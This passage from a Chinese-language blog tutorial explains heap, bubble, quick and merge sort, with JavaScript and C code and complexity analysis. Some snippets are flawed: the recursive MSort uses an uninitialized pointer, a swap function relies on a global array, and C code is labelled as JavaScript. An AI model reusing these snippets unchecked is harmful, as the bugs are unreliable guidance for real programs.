class="line"></span><br><span class="line"><span class="comment">/* 将最大的元素调整到堆顶*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AdjustHeap</span>(<span class="params">arr, pos, len</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> swap = arr[pos];      <span class="comment">//保存当前节点</span></span><br><span class="line">    <span class="keyword">let</span> child = pos * <span class="number">2</span> + <span class="number">1</span>;  <span class="comment">//定位到当前节点的左边的子节点</span></span><br><span class="line">    <span class="keyword">while</span>(child &lt; len)&#123;       <span class="comment">//递归遍历所有的子节点</span></span><br><span class="line">        <span class="comment">//判断当前节点是否有右节点，若右节点较大，就采用右节点和当前节点进行比较</span></span><br><span class="line">        <span class="keyword">if</span>(child + <span class="number">1</span> &lt; len &amp;&amp; arr[child] &lt; arr[child + <span class="number">1</span>])&#123;</span><br><span class="line">            child += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//比较当前节点和最大的子节点，小于就交换，交换后将当前节点定位到子节点上</span></span><br><span class="line">        <span class="keyword">if</span>(arr[pos] &lt; arr[child])&#123;          </span><br><span class="line">            arr[pos]=arr[child];        </span><br><span class="line">            pos = child;</span><br><span class="line">            child = pos * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[pos] = swap;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 构建堆：</span></span><br><span class="line"><span class="comment"> * 满足：树中任一非叶子结点的关键字均不大于（或不小于）其左右孩子结点的关键字。</span></span><br><span class="line"><span class="comment"> * 实现：从最后一个拥有子节点的节点开始，将该节点和其他节点进行比较，将最大的数交换给该节点，</span></span><br><span class="line"><span class="comment"> *      交换后再依次向前节点进行相同的交换处理，直到构建出大顶堆。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BuildHeap</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len =arr.length;</span><br><span class="line">    <span class="keyword">let</span> n= <span class="built_in">Math</span>.floor((len<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=n; i&gt;=<span class="number">0</span>; i--)&#123;  <span class="comment">//构建大顶堆</span></span><br><span class="line">        AdjustHeap(arr, i, arr.length);<span class="comment">//从第一个非叶子结点从下至上，从右至左调整结构</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*堆排序算法*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HeapSort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    BuildHeap(arr); <span class="comment">//构建堆</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=arr.length<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--)&#123;   <span class="comment">//从数组的尾部进行调整</span></span><br><span class="line">        <span class="keyword">let</span> swap = arr[i];  <span class="comment">//堆顶永远是最大的元素,将堆顶和尾部元素交换，最大元素就保存在尾部，并且不参与后面的调整</span></span><br><span class="line">        arr[i] = arr[<span class="number">0</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = swap;</span><br><span class="line">        AdjustHeap(arr, <span class="number">0</span>, i); <span class="comment">//重新对堆进行调整</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">46</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">19</span>,<span class="number">80</span>,<span class="number">33</span>,<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">46</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">19</span>,<span class="number">80</span>,<span class="number">33</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'before: '</span> + arr);</span><br><span class="line">HeapSort(arr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">' after: '</span> + arr);</span><br></pre></td></tr></table></figure><p>分析:<br>堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)…1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p><p>设树深度为k，k=floor(logn)+1 。从根到叶的筛选，元素比较次数至多2(k-1)次，交换记录至多k 次。所以，在建好堆后，排序过程中的筛选次数不超过下式：<br> &lt;%asset_img heap_sort_3.png%&gt;<br>而建堆时的比较次数不超过4n 次，因此堆排序最坏情况下，时间复杂度也为：O(nlogn )。</p><h2 id="交换排序—冒泡排序（Bubble-Sort）（下沉）"><a href="#交换排序—冒泡排序（Bubble-Sort）（下沉）" class="headerlink" title="交换排序—冒泡排序（Bubble Sort）（下沉）"></a>交换排序—冒泡排序（Bubble Sort）（下沉）</h2><h4 id="基本思想：-2"><a href="#基本思想：-2" class="headerlink" title="基本思想："></a>基本思想：</h4><p>在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p><p>冒泡排序的示例：<br>&lt;%asset_img bubble_sort.png%&gt;</p><h4 id="算法的实现：-2"><a href="#算法的实现：-2" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> bubbleSort(int a[], int n)&#123; </span><br><span class="line"><span class="keyword">for</span>(int i =<span class="number">0</span> ; i&lt; n<span class="number">-1</span>; ++i) &#123; <span class="comment">//i只是次数</span></span><br><span class="line">    <span class="keyword">for</span>(int j = <span class="number">0</span>; j &lt; n-i<span class="number">-1</span>; ++j) &#123; </span><br><span class="line">        <span class="keyword">if</span>(a[j] &gt; a[j+<span class="number">1</span>]) &#123; </span><br><span class="line">        int tmp = a[j] ;</span><br><span class="line">         a[j] = a[j+<span class="number">1</span>] ; </span><br><span class="line">         a[j+<span class="number">1</span>] = tmp; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="冒泡排序算法的改进"><a href="#冒泡排序算法的改进" class="headerlink" title="冒泡排序算法的改进"></a>冒泡排序算法的改进</h4><p>对冒泡排序常见的改进方法是加入一标志性变量<code>exchange</code>，用于标志某一趟排序过程中是否有数据交换，如果进行某一趟排序时并没有进行数据交换，则说明数据已经按要求排列好，可立即结束排序，避免不必要的比较过程。本文再提供以下两种改进算法：</p><ol><li>设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于<strong>pos位置之后的记录均已交换到位</strong>,故在进行下一趟排序时只要扫描到pos位置即可。</li></ol><p>改进后算法如下:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Bubble_1 ( int r[], int n) &#123; </span><br><span class="line">int i= n <span class="number">-1</span>; <span class="comment">//初始时,最后位置保持不变 </span></span><br><span class="line"><span class="keyword">while</span> ( i&gt; <span class="number">0</span>) &#123; </span><br><span class="line">    int pos= <span class="number">0</span>; <span class="comment">//每趟开始时,无记录交换 </span></span><br><span class="line">    <span class="keyword">for</span> (int j= <span class="number">0</span>; j&lt; i; j++) </span><br><span class="line">    <span class="keyword">if</span> (r[j]&gt; r[j+<span class="number">1</span>]) &#123; </span><br><span class="line">        pos= j; <span class="comment">//记录交换的位置 </span></span><br><span class="line">        int tmp = r[j]; r[j]=r[j+<span class="number">1</span>];r[j+<span class="number">1</span>]=tmp; </span><br><span class="line">    &#125; </span><br><span class="line">    i= pos; <span class="comment">//为下一趟排序作准备 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol><li>传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者) , 从而使排序趟数几乎减少了一半。</li></ol><p>改进后的算法实现为:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Bubble_2 ( int r[], int n)&#123; </span><br><span class="line">    int low = <span class="number">0</span>; </span><br><span class="line">    int high= n <span class="number">-1</span>; <span class="comment">//设置变量的初始值 </span></span><br><span class="line">    int tmp,j; </span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123; </span><br><span class="line">        <span class="keyword">for</span> (j= low; j&lt; high; ++j)&#123; <span class="comment">//正向冒泡,找到最大者 </span></span><br><span class="line">            <span class="keyword">if</span> (r[j]&gt; r[j+<span class="number">1</span>]) &#123; </span><br><span class="line">            tmp = r[j]; r[j]=r[j+<span class="number">1</span>];r[j+<span class="number">1</span>]=tmp; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        --high; <span class="comment">//修改high值, 前移一位 </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( j=high; j&gt;low; --j)&#123; <span class="comment">//反向冒泡,找到最小者 </span></span><br><span class="line">            <span class="keyword">if</span> (r[j]&lt;r[j<span class="number">-1</span>]) &#123; </span><br><span class="line">                tmp = r[j]; r[j]=r[j<span class="number">-1</span>];r[j<span class="number">-1</span>]=tmp; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        ++low; <span class="comment">//修改low值,后移一位 </span></span><br><span class="line">        </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="交换排序—快速排序（Quick-Sort）"><a href="#交换排序—快速排序（Quick-Sort）" class="headerlink" title="交换排序—快速排序（Quick Sort）"></a>交换排序—快速排序（Quick Sort）</h2><h4 id="基本思想：-3"><a href="#基本思想：-3" class="headerlink" title="基本思想："></a>基本思想：</h4><pre><code>1）选择一个基准元素,通常选择第一个元素或者最后一个元素。2）通过一趟排序将待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。3）此时基准元素在其排好序后的正确位置。4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</code></pre><p>快速排序的示例：</p><p>（a）一趟排序的过程：<br> &lt;%asset_img bubble_sort_1.png%&gt;</p><p>（b）排序的全过程<br>  &lt;%asset_img bubble_sort_2.png%&gt;</p><p>&lt;%asset_img quick_sort.png%&gt;</p><h4 id="算法的实现：-3"><a href="#算法的实现：-3" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">s,t</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">let</span> tmp = a[s];</span><br><span class="line">    a[s]=a[t];</span><br><span class="line">    a[t]=tmp; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">a,low, high</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">let</span> privotIndex=low;</span><br><span class="line">    <span class="keyword">let</span> privotKey = a[low]; <span class="comment">//基准元素 </span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)&#123; <span class="comment">//从表的两端交替地向中间扫描 </span></span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; </span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; </span><br><span class="line">        <span class="keyword">if</span>(low &lt; high) swap(low, high); </span><br><span class="line">    &#125; </span><br><span class="line">    swap(low,privotIndex)</span><br><span class="line">    <span class="keyword">return</span> low; <span class="comment">//这里low和high相等</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">a, low, high</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(low &lt; high)&#123; </span><br><span class="line">        <span class="keyword">let</span> privotLoc = partition(a, low, high); <span class="comment">//将表一分为二 </span></span><br><span class="line">        quickSort(a, low, privotLoc <span class="number">-1</span>); <span class="comment">//递归对低子表递归排序 </span></span><br><span class="line">        quickSort(a, privotLoc + <span class="number">1</span>, high); <span class="comment">//递归对高子表递归排序 </span></span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> a= [<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">8</span>]; </span><br><span class="line">quickSort(a,<span class="number">0</span>,a.length<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>快速排序是通常被认为在同数量级（O(nlog2n)）的排序方法中平均性能最好的。但若初始序列按关键码有序或基本有序时，快排序反而蜕化为冒泡排序。为改进之，通常以“三者取中法”来选取基准记录，即将排序区间的两个端点与中点三个记录关键码居中的调整为支点记录。快速排序是一个<code>不稳定</code>的排序方法。</p><h4 id="快速排序的改进"><a href="#快速排序的改进" class="headerlink" title="快速排序的改进"></a>快速排序的改进</h4><p>在本改进算法中,只对长度大于k的子序列递归调用快速排序,让原序列基本有序，然后再对整个基本有序序列用插入排序算法排序。实践证明，改进后的算法时间复杂度有所降低，且当k取值为 8 左右时,改进算法的性能最佳。算法思想如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> print(int a[], int n)&#123; </span><br><span class="line"><span class="keyword">for</span>(int j= <span class="number">0</span>; j&lt;n; j++)&#123; </span><br><span class="line">cout&lt;&lt;a[j] &lt;&lt;<span class="string">" "</span>; </span><br><span class="line">&#125; </span><br><span class="line">cout&lt;&lt;endl; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> swap(int *a, int *b) </span><br><span class="line">&#123; </span><br><span class="line">int tmp = *a; </span><br><span class="line">*a = *b; </span><br><span class="line">*b = tmp; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int partition(int a[], int low, int high) &#123; </span><br><span class="line">    int privotKey = a[low]; <span class="comment">//基准元素 </span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)&#123; <span class="comment">//从表的两端交替地向中间扫描 </span></span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; <span class="comment">//从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端 </span></span><br><span class="line">        swap(&amp;a[low], &amp;a[high]); </span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; </span><br><span class="line">        swap(&amp;a[low], &amp;a[high]); </span><br><span class="line">    &#125; </span><br><span class="line">    print(a,<span class="number">10</span>); </span><br><span class="line">    <span class="keyword">return</span> low; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> qsort_improve(int r[ ],int low,int high, int k)&#123; </span><br><span class="line">    <span class="keyword">if</span>( high -low &gt; k ) &#123; <span class="comment">//长度大于k时递归, k为指定的数 </span></span><br><span class="line">        int pivot = partition(r, low, high); <span class="comment">// 调用的Partition算法保持不变 </span></span><br><span class="line">        qsort_improve(r, low, pivot - <span class="number">1</span>,k); </span><br><span class="line">        qsort_improve(r, pivot + <span class="number">1</span>, high,k); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> quickSort(int r[], int n, int k)&#123; </span><br><span class="line">    qsort_improve(r,<span class="number">0</span>,n,k);<span class="comment">//先调用改进算法Qsort使之基本有序 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//再用插入排序对基本有序序列排序 </span></span><br><span class="line">    <span class="keyword">for</span>(int i=<span class="number">1</span>; i&lt;=n;i ++)&#123; </span><br><span class="line">        int tmp = r[i]; </span><br><span class="line">        int j=i<span class="number">-1</span>; </span><br><span class="line">        <span class="keyword">while</span>(tmp &lt; r[j])&#123; </span><br><span class="line">            r[j+<span class="number">1</span>]=r[j]; j=j<span class="number">-1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        r[j+<span class="number">1</span>] = tmp; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">int main()&#123; </span><br><span class="line">int a[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">8</span>&#125;; </span><br><span class="line">cout&lt;&lt;<span class="string">"初始值："</span>; </span><br><span class="line">print(a,<span class="number">10</span>); </span><br><span class="line">quickSort(a,<span class="number">9</span>,<span class="number">4</span>); </span><br><span class="line">cout&lt;&lt;<span class="string">"结果："</span>; </span><br><span class="line">print(a,<span class="number">10</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h2><h4 id="基本思想：-4"><a href="#基本思想：-4" class="headerlink" title="基本思想："></a>基本思想：</h4><p>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</p><p>归并排序示例：<br> &lt;%asset_img merge_sort.png%&gt;</p><p> &lt;%asset_img merge_sort2.png%&gt;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>])</span><br><span class="line">      tmp.push(left.shift());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      tmp.push(right.shift());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tmp.concat(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a.length === <span class="number">1</span>) </span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> mid = ~~(a.length / <span class="number">2</span>)</span><br><span class="line">    , left = a.slice(<span class="number">0</span>, mid)</span><br><span class="line">    , right = a.slice(mid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段合并排序的代码相当简单直观，但是mergeSort()函数会导致很频繁的自调用。一个长度为n的数组最终会调用mergeSort() 2*n-1次，这意味着如果需要排序的数组长度很大会在某些栈小的浏览器上发生栈溢出错误。</p><p>这里插个话题，关于递归调用时浏览器的栈大小限制，可以用代码去测试：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="built_in">arguments</span>.callee();</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.message, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// chrome: Maximum call stack size exceeded 35992</span></span><br><span class="line"><span class="comment">// firefox: too much recursion 11953</span></span><br></pre></td></tr></table></figure></p><p>遇到栈溢出错误并不一定要修改整个算法，只是表明递归不是最好的实现方式。这个合并排序算法同样可以迭代实现，比如（摘抄自《高性能JavaScript》）：</p><h4 id="归并的迭代算法"><a href="#归并的迭代算法" class="headerlink" title="归并的迭代算法"></a>归并的迭代算法</h4><p>1个元素的表总是有序的。所以对n 个元素的待排序列，每个元素可看成1 个有序子表。对子表两两合并生成n/2个子表，所得子表除最后一个子表长度可能为1 外，其余子表长度均为2。再进行两两合并，直到生成n 个元素按关键码有序的表。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>])</span><br><span class="line">      result.push(left.shift());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result.push(right.shift());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result.concat(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a.length === <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> work = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = a.length; i &lt; len; i++)</span><br><span class="line">    work.push([a[i]]);</span><br><span class="line"></span><br><span class="line">  work.push([]); <span class="comment">// 如果数组长度为奇数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> lim = len; lim &gt; <span class="number">1</span>; lim = ~~((lim + <span class="number">1</span>) / <span class="number">2</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, k = <span class="number">0</span>; k &lt; lim; j++, k += <span class="number">2</span>) </span><br><span class="line">      work[j] = merge(work[k], work[k + <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    work[j] = []; <span class="comment">// 如果数组长度为奇数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> work[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(mergeSort([<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>]));</span><br></pre></td></tr></table></figure></p><h4 id="两路归并的递归算法"><a href="#两路归并的递归算法" class="headerlink" title="两路归并的递归算法"></a>两路归并的递归算法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MSort(ElemType *r, ElemType *rf,int s, int t) </span><br><span class="line">&#123; </span><br><span class="line">ElemType *rf2; </span><br><span class="line"><span class="keyword">if</span>(s==t) r[s] = rf[s]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    int m=(s+t)/<span class="number">2</span>; <span class="comment">/*平分*p 表*/</span> </span><br><span class="line">    MSort(r, rf2, s, m); <span class="comment">/*递归地将p[s…m]归并为有序的p2[s…m]*/</span> </span><br><span class="line">    MSort(r, rf2, m+<span class="number">1</span>, t); <span class="comment">/*递归地将p[m+1…t]归并为有序的p2[m+1…t]*/</span> </span><br><span class="line">    Merge(rf2, rf, s, m+<span class="number">1</span>,t); <span class="comment">/*将p2[s…m]和p2[m+1…t]归并到p1[s…t]*/</span> </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> 